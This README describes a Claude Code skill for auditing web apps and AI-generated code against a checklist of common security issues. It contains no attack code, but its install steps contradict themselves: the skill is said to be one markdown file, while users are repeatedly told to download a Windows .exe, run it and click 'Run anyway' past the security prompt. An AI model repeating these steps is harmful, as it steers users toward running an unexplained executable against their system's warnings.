# 🛡️ vibe-code-security-audit - Check Code for Security Risks

[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/Pold911/vibe-code-security-audit/releases)

## 🔽 Download

Visit this page to download: https://github.com/Pold911/vibe-code-security-audit/releases

On Windows, open the latest release and download the file that matches your system. If there is more than one file, choose the one that ends in `.exe` or the Windows package listed in the release notes.

## 🪟 Run on Windows

1. Download the app from the Releases page.
2. Open your Downloads folder.
3. Double-click the file you downloaded.
4. If Windows shows a security prompt, choose **Run anyway** if you trust the source.
5. Follow the on-screen steps to finish setup.
6. Open the app from the Start menu or from the shortcut on your desktop.

If the app starts in a command window, leave that window open while you use it.

## 📋 What This Does

`vibe-code-security-audit` helps you check web apps and AI-made code for common security problems. It focuses on real issues that can lead to data leaks, account access problems, and unsafe app behavior.

Use it to review:

- Web apps
- API routes
- Server code
- Front-end code
- AI-generated code
- Small scripts before you share them

It looks for the kinds of mistakes that often slip into fast builds and early versions.

## 🔍 What It Checks

This tool is designed to review code for the 20 most common security issues, including:

- Weak input checks
- Unsafe use of user data
- Broken access control
- Missing auth checks
- Exposed secrets
- Unsafe file handling
- Cross-site scripting risks
- SQL injection risks
- Command injection risks
- Bad password handling
- Weak session handling
- Unsafe redirects
- Poor error handling
- Missing rate limits
- Open CORS rules
- Insecure headers
- Overly broad permissions
- Unsafe deserialization
- Weak token handling
- Hidden debug paths
- Misconfigurations

## ⚙️ Before You Start

Have these ready on your Windows PC:

- A recent version of Windows 10 or Windows 11
- Internet access to download the release
- A web app, code folder, or API project to review
- Claude Code set up on your machine

If you plan to review source code, keep the project in a folder you can reach easily.

## 🧩 Install the Skill in Claude Code

This project works as a Claude Code skill.

1. Download the release from the link above.
2. Find the `skill.md` file in the downloaded files.
3. Copy `skill.md` into your Claude Code skills folder.
4. Rename it to `vibe-code-security-audit.md`.

Typical Windows path:

- `C:\Users\YourName\.claude\skills\`

If the folder does not exist, create it first.

## 🛠️ File Setup Example

Place the skill file here:

- `C:\Users\YourName\.claude\skills\vibe-code-security-audit.md`

After that, restart Claude Code so it can load the new skill.

## 🚀 How to Use It

Ask Claude to review your code for security issues.

Example prompts:

- Audit my app for security vulnerabilities
- Is my code secure?
- Run a security review on this API
- Check for OWASP issues
- Harden my Express app
- Review this login flow for risks
- Find security problems in this project

You can also paste code directly or point Claude to a folder in your project.

## 🧪 Best Results

For a useful review, give Claude clear context:

- What the app does
- Which parts handle logins or user data
- Whether the app stores secrets
- Which framework you use
- Any areas you already trust less

Good input helps the audit focus on the right parts of the code.

## 📁 Example Use Cases

You can use this skill for:

- A Node.js API with login forms
- A React app that sends form data
- An Express app with file uploads
- A Python app with user accounts
- AI-generated code from a quick build
- A small internal tool before launch

It is useful when you want a fast review before you test or ship.

## 🔧 What You Need on Windows

To keep things simple, use:

- A standard Windows account with write access to your user folder
- Enough free space to store the release files
- A text editor if you want to inspect `skill.md`
- Claude Code installed and signed in

If you use a work PC, make sure you can save files in your user profile.

## 🗂️ Folder Layout

A simple setup looks like this:

- `Downloads\`
- `C:\Users\YourName\.claude\skills\`
- `YourProjectFolder\`

Keep the skill file in the Claude skills folder and keep your project files in a separate folder.

## ❓ Common Questions

### Do I need programming knowledge?

No. You only need to download the release, copy one file, and ask Claude to review your code.

### Can I use it with any app?

It works best with web apps, APIs, and code that handles user data.

### Does it replace a full security review?

No. It helps you spot common issues early and gives you a strong first pass.

### Can I use it on AI-generated code?

Yes. It is a good fit for code that was written fast and needs a security check.

## 📌 Credit

Checklist sourced from [@hartdrawss](https://x.com/hartdrawss/status/2039998901176897860)

## 📥 Direct Download

Visit this page to download the latest release: https://github.com/Pold911/vibe-code-security-audit/releases

## 🪟 Windows Quick Steps

1. Open the Releases page.
2. Download the latest Windows file.
3. Copy `skill.md` into `C:\Users\YourName\.claude\skills\`
4. Restart Claude Code.
5. Ask Claude to audit your code